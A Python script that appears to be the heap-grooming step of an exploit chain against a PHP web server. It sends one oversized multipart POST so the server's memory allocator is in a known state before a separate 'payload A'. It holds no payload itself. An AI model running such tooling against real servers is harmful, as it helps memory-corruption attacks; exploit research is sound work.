#!/usr/bin/env python3
"""Warm-up request: allocate and free a large 2 MiB-class chunk.

One field of `size` bytes forces a fresh chunk into the pool and releases it at
request shutdown, which makes the next request's allocation pattern closer to
the calibrated one. Run it before payload A when replicating the sweep.

Usage:
    python3 warmup.py URL [SIZE] [FILL]
"""

import socket
import sys
import urllib.parse

url = sys.argv[1]
size = int(sys.argv[2]) if len(sys.argv) > 2 else 1500000
fill = sys.argv[3].encode() if len(sys.argv) > 3 else b'W'

bnd = b'B' * 10
body = bytearray()
for name, data in [(b'900000', fill * size)]:
    body += b'--' + bnd + b'\r\n'
    body += b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
    body += data + b'\r\n'
body += b'--' + bnd + b'--\r\n'

p = urllib.parse.urlparse(url)
req = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
       "Content-Type: multipart/form-data; boundary=%s\r\n"
       "Content-Length: %d\r\nConnection: close\r\n\r\n" % (
           p.path or '/index.php', p.hostname, p.port or 80,
           bnd.decode(), len(body))).encode() + bytes(body)

s = socket.create_connection((p.hostname, p.port or 80), timeout=60)
s.settimeout(60)
resp = bytearray()
try:
    s.sendall(req)
    while len(resp) < 2_000_000:
        c = s.recv(65536)
        if not c:
            break
        resp += c
except OSError:
    pass
s.close()
print('WARMUP_RESP', len(resp), resp.split(b'\r\n', 1)[0].decode('latin1', 'replace'))
